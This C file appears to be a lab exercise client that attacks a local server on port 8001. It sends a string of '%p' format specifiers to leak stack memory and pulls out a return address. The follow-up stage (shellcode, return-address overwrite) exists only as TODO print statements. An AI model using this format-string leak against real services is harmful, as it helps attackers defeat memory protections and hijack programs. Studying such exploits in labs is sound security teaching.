#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define PORTNUM 8001
#define BLENGTH 256

char ret_addr_str[10];
long ret_add_long;


static void
scrape_le_stack(int s)
{
  char buffer[BLENGTH];
  char response_buffer[] = "%p %p %p %p %p %p %p %p %p %p"; //ret addr is the last one
  char res_str_noise[] = " , is not a valid option\n." \
                         "Please select an option:\n1. Time\n2. Date\n";
  int res_str_trim_len, res_buffer_index;
  
  /* Receive a prompt from the server */
  if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
    perror("recv()");
    exit(EXIT_FAILURE);
  }

  /* Send the response to the server */
  send(s, (void *)response_buffer, BLENGTH, 0);

  /* Receive a reply from the server */
  recv(s, (void *)response_buffer, BLENGTH, 0);
  printf("Response:\n %s\n", response_buffer);
  
  /* Slice the ret_addr_str from the response_buffer */
  res_str_trim_len = strlen(res_str_noise) + 10;
  res_buffer_index = strlen(response_buffer) - res_str_trim_len;
  memcpy(ret_addr_str, &response_buffer[res_buffer_index], 10);
  printf("Return address:%s\n", ret_addr_str);
  
  /* Parse ret_addr_str to ret_add_long */
  ret_add_long = strtol(ret_addr_str, NULL, 0);
  printf("Return address (long): %ld\n", ret_add_long);
}

static void
hack_le_stack(int s)
{
  printf("TODO - obtain shellcode\n");
  printf("TODO - calculate new return address\n");
  printf("TODO - construct attack str\n");
  printf("TODO - send attack str\n");
}

/* Connect and talk to the server */
int
main()
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;
  
  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }
  
  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }
  
  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);
  
  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }
  
  /* Scrape the return address to be overwriten on le server */
  scrape_le_stack(s);
  
  /* Send attack str to le server */
  hack_le_stack(s);
  
  /* Close the socket */
  close(s);
  
  return (0);
}
